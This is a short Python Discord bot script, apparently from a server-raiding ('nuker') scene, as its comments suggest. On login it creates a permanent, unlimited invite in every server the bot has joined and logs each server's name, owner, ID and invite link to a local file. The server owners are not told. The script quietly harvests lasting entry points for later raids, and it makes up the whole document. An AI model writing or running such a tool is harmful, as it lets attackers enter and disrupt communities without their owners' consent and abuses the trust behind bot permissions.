import discord
from discord.ext import commands

# Replace 'UR TOKEN' with your bot's token
TOKEN = 'UR TOKEN'

# BITZXIER TATI
intents = discord.Intents.default()
intents.guilds = True

# DARKS PAPA OK ?
darks = commands.Bot(command_prefix='!', intents=intents)

@darks.event
async def on_ready():
    print(f'Logged in as: {darks.user.name}')
    
    with open('Darks.txt', 'w') as f:
        for guild in darks.guilds:
            # NUKERS RUNS CORD DR ON TOP!
            invite = await create_permanent_invite(guild)
            if invite:
                server_info = (
                    f"Server Name: {guild.name}\n"
                    f"Server Owner: {guild.owner}\n"
                    f"Server ID: {guild.id}\n"
                    f"Invite Link: {invite}\n"
                    "-------------------------\n"
                )
                f.write(server_info)
    print('Server information saved to Darks.txt')

async def create_permanent_invite(guild):
    # Attempt to create a permanent invite for the default channel
    for channel in guild.text_channels:
        if channel.permissions_for(guild.me).create_instant_invite:
            invite = await channel.create_invite(max_age=0, max_uses=0)
            return invite
    return None

# Run the bot
darks.run(TOKEN)
